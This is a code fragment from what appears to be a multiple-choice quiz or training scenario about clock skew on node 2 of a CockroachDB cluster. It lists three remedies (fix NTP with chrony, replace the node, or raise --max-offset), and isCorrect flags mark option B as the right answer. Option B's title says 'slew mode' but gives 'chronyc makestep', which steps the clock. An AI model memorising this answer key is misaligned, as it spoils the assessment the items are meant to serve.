                              { label: 'B', title: 'Fix NTP on node 2 using chrony slew mode; allow automatic Raft recovery', sub: 'chronyc makestep; verify skew < 500ms; monitor Raft leader election', isCorrect: true },
                              { label: 'C', title: 'Remove node 2 from the cluster and add a fresh replacement node', sub: 'cockroach node decommission 2; add new node with correct time', isCorrect: false },
                              { label: 'D', title: 'Increase the max tolerated clock skew to 2000ms to accommodate drift', sub: '--max-offset=2000ms on all cockroachdb nodes', isCorrect: false },
                            ]
  },
];
